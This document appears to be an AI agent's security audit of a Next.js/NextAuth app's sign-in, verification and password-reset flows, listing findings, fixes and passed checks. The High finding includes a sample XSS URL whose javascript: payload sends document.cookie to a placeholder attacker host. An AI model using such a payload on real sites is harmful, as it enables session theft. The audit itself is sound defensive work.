# Auth Security Review

**Last audit:** 2026-06-12
**Scope:** NextAuth config, credentials / email-verification / password-reset flows, profile page & account actions
**Auditor:** auth-auditor agent

## Summary

One **High** finding (client-side XSS via the `callbackUrl` query parameter after credentials sign-in), one **Low** finding (registration endpoint enables user enumeration), and three **Informational** notes (no rate limiting; `getBaseUrl()` host-header fallback; JWT sessions are not invalidated on password change). The token-handling code for email verification and password reset is well-built: cryptographically strong entropy, sensible TTLs, atomic single-use consumption inside transactions, and namespacing that prevents cross-flow replay. Overall posture is good — the XSS is the only thing requiring an immediate fix.

## Findings

### Critical

None.

### High

#### 1. XSS via `callbackUrl` in `router.push` after credentials sign-in

- **File:** `src/components/auth/SignInForm.tsx:14, 89`
- **Severity:** High
- **Issue:** `callbackUrl` is read directly from the URL search params and passed unsanitised to `router.push(callbackUrl)` after a successful credentials sign-in. Per the official Next.js docs, `router.push`/`router.replace` from `next/navigation` will execute `javascript:` URLs. A `javascript:` URL passed here would run in the page's origin, with access to the freshly authenticated session.
  ```ts
  // src/components/auth/SignInForm.tsx
  const callbackUrl = searchParams.get("callbackUrl") ?? "/dashboard"
  // …
  router.push(callbackUrl)
  ```
- **Impact:** Phishing/XSS — an attacker who can get a victim to click `https://devstash.example/sign-in?callbackUrl=javascript:fetch('https://evil.tld/x?c='+document.cookie)` and then sign in will execute arbitrary script inside their authenticated session, allowing exfiltration of session data, mutation of their items/collections, password change attempts, etc.
- **Fix:** Validate `callbackUrl` is a same-origin, scheme-safe path before navigating. Reject anything that does not start with a single `/` followed by a non-`/` character, or that contains `:` in the first segment. For example:
  ```ts
  function safeCallback(raw: string | null): string {
    if (!raw) return "/dashboard"
    // only allow internal, absolute paths, no protocol-relative URLs
    if (!raw.startsWith("/") || raw.startsWith("//")) return "/dashboard"
    return raw
  }
  const callbackUrl = safeCallback(searchParams.get("callbackUrl"))
  ```
  Note: the GitHub OAuth call on line 110 (`signIn("github", { callbackUrl })`) is **not** affected — NextAuth v5's default `redirect` callback restricts `callbackUrl` to same-origin URLs. Only the credentials path uses `router.push` directly.

### Medium

None.

### Low

#### 2. User enumeration via registration endpoint

- **File:** `src/app/api/auth/register/route.ts:29-32`
- **Severity:** Low
- **Issue:** Registration returns HTTP `409 "Email already in use"` when the email is taken. An attacker can probe arbitrary email addresses to learn which are registered with DevStash.
  ```ts
  const existing = await prisma.user.findUnique({ where: { email } })
  if (existing) {
    return NextResponse.json({ error: "Email already in use" }, { status: 409 })
  }
  ```
  The other auth endpoints (`/forgot-password`, `/resend-verification`) correctly return `200` unconditionally to avoid this leak; registration is the only enumeration vector left.
- **Impact:** Lets an attacker compile a list of DevStash users for targeted phishing or credential-stuffing campaigns.
- **Fix:** Two common options — (a) accept the enumeration as a UX tradeoff and add rate limiting (see Informational #3); (b) decouple the response: return `200 success` to all signups, and if the email is already taken, send an email to the existing address ("someone tried to sign up with your email — sign in here"). Option (b) closes the leak without breaking UX.

### Informational

#### 3. No rate limiting on auth endpoints

- **Files:** `src/app/api/auth/register/route.ts`, `src/app/api/auth/forgot-password/route.ts`, `src/app/api/auth/resend-verification/route.ts`, `src/app/api/auth/reset-password/route.ts`, `src/app/api/auth/change-password/route.ts`, NextAuth credentials authorize in `src/auth.ts`
- **Severity:** Informational
- **Issue:** None of the unauthenticated or authenticated auth routes enforce request limits. This enables: credential stuffing against `signIn("credentials")`, brute force against the current-password check on `change-password`, password-spray on `reset-password`, mass email triggering on `forgot-password` / `resend-verification` (abuse of the Resend quota), and registration spam.
- **Fix:** Add IP+identifier rate limiting in front of these routes — e.g. `@upstash/ratelimit` with a sliding window (10/min/IP for `forgot-password` and `resend-verification`, 5/min/IP+email for `signIn`/`reset-password`/`change-password`). A Next.js `middleware.ts`/`proxy.ts` matcher targeting `/api/auth/(?!callback|session|csrf)` is the easiest place to wire it.

#### 4. `getBaseUrl()` falls back to request URL when no env var is set

- **File:** `src/lib/verification.ts:7-11`
- **Severity:** Informational
- **Issue:** When neither `NEXTAUTH_URL` nor `AUTH_URL` is set, the verification + password-reset emails build their links from `new URL(request.url).origin`. `request.url` in Next.js reflects the incoming `Host` header. If the deployment ever runs without `NEXTAUTH_URL` set, and the upstream proxy passes through an attacker-supplied `Host` (or `X-Forwarded-Host` that Next.js trusts), the email could be poisoned with a malicious base URL, turning the verification/reset link into a credential-harvesting URL.
- **Impact:** Defense-in-depth concern only — in production both Vercel and self-hosted setups should set `NEXTAUTH_URL`, and `.env.example` already documents it. Worth a guardrail.
- **Fix:** Make `NEXTAUTH_URL` (or `AUTH_URL`) required in production — throw at startup if neither is set when `NODE_ENV === "production"`. The `request.url` fallback can stay for local dev.

#### 5. JWT sessions are not invalidated after password change or reset

- **Files:** `src/app/api/auth/change-password/route.ts:53-56`, `src/app/api/auth/reset-password/route.ts:29-30`
- **Severity:** Informational
- **Issue:** After a successful password change or reset, existing JWT sessions on other devices (or in an attacker's possession) remain valid until their natural expiry. Because `session.strategy = "jwt"` and there is no per-user "password changed at" check in the `jwt`/`session` callbacks, the new password does not log other devices out.
- **Impact:** If a user resets their password because they suspect compromise, the attacker's existing JWT keeps working until it expires.
- **Fix:** This is a known JWT-strategy tradeoff. To close it without switching to DB sessions, persist a `passwordChangedAt` timestamp on `User`, embed it into the JWT at sign-in (e.g. `token.pwdAt`), and compare it to the DB value in the `jwt` callback on each request, returning `null` if they differ. Acceptable to defer — most apps tolerate this gap.

## Passed Checks

- **Token entropy (verification.ts:22, password-reset.ts:22)** — both flows use `crypto.randomBytes(32).toString("hex")`, producing 256-bit cryptographically secure tokens. Not `Math.random`, not a UUID, not predictable.
- **Token TTLs are stored in the DB and checked on consumption (verification.ts:5, 41; password-reset.ts:5, 46)** — 24 h for email verification, 1 h for password reset.
- **Atomic single-use consumption (verification.ts:46-53, password-reset.ts:54-60)** — token validation and deletion happen inside a `prisma.$transaction` together with the user update, so there is no TOCTOU window in which a token could be replayed.
- **Cross-flow token replay is blocked (verification.ts:39)** — `consumeVerificationToken` explicitly rejects identifiers containing `:`, so a `password-reset:<email>` token cannot be replayed at `/api/auth/verify-email`. `consumePasswordResetToken` symmetrically enforces the `password-reset:` prefix (password-reset.ts:42).
- **bcrypt cost factor 12 (register/route.ts:34, reset-password/route.ts:29, change-password/route.ts:52)** — comfortably above the current OWASP/industry baseline.
- **Constant-time password comparison (auth.ts:34, change-password/route.ts:47)** — uses `bcrypt.compare`, never raw `===`.
- **Forgot-password endpoint resists enumeration (forgot-password/route.ts:32)** — returns `200 success` unconditionally; only sends an email when a user with a `password` field exists. OAuth-only users are silently skipped without distinguishable response.
- **Resend-verification endpoint resists enumeration (resend-verification/route.ts:24-36)** — returns `200 success` unconditionally, only mails when the user exists *and* has a password *and* is not yet verified.
- **Credentials `authorize` returns null on every failure mode (auth.ts:29-39)** — does not distinguish "user not found" vs "wrong password" vs "no password" to the caller.
- **Profile, change-password, and delete-account all gate on session (profile/page.tsx:18-19, profile/layout.tsx:8-9, change-password/route.ts:8-11, delete-account/route.ts:7-10)** — every entry point calls `auth()` and redirects/401s when there is no session.
- **All mutations are scoped to `session.user.id` (change-password/route.ts:36, 54; delete-account/route.ts:22; profile/page.tsx:25; profile/layout.tsx:12-13)** — never trust a `userId` from the request body or URL.
- **Change-password requires current password verification before rehashing (change-password/route.ts:47-50)** — prevents session-hijack-to-password-takeover.
- **Delete-account requires typing the exact email (delete-account/route.ts:15-20)** — case-insensitive and trimmed; matches the client-side `userEmail` prop, which is itself derived from the server session.
- **No password hash leaks to clients (profile/page.tsx:26, 33)** — the profile server component selects `password` only to compute the `hasPassword: boolean` derived value; only the boolean (via `{hasPassword && <ChangePasswordCard />}`) and `user.email` ever flow to client components.
- **Split NextAuth config respects edge-safety (auth.config.ts)** — `auth.config.ts` imports only `NextAuthConfig` and providers, never Prisma or bcryptjs. Heavy Node-only logic lives in `src/auth.ts`.
- **Middleware-level route protection (auth.config.ts:30-39 + proxy.ts)** — `authorized` callback restricts `/dashboard/*` and `/profile/*` to logged-in users, in addition to per-page server-side `auth()` checks.
- **JWT/session callbacks expose only the user id (auth.config.ts:22-29)** — no email, name, password, or other sensitive fields are mirrored into the JWT beyond what NextAuth adds.
- **Reset-password does not consume the token on bad input (reset-password/route.ts:14-30)** — input validation runs before `consumePasswordResetToken`, so users do not lose their reset link to a typo and an attacker cannot DoS a known token by submitting an invalid password to it.
- **`EMAIL_VERIFICATION_ENABLED` defaults to on in production (features.ts:3)** — explicit `=== "true"` check avoids accidental enablement via stray truthy values, while the production default fail-closes if the env var is forgotten.

## Notes

- **Rate limiting** is the single biggest gap. It is intentionally consolidated into Informational #3 rather than split across each endpoint.
- **Password policy** is "≥ 8 characters" with no complexity rules and no breach-corpus check. This is **not** flagged — NIST SP 800-63B (current guidance) explicitly recommends ≥ 8 with no complexity rules; adding a HaveIBeenPwned check would be a nice-to-have but is not a defect.
- **Existing session race on delete-account** is acceptable: after `prisma.user.delete`, any lingering JWT still resolves a session shape, but subsequent DB lookups by `session.user.id` will return null, and the client immediately calls `signOut()` on success.
- **`router.push("/sign-in?…")` in the other auth forms** (RegisterForm, ResetPasswordForm) is safe — those callsites pass string literals, not user-controlled values.
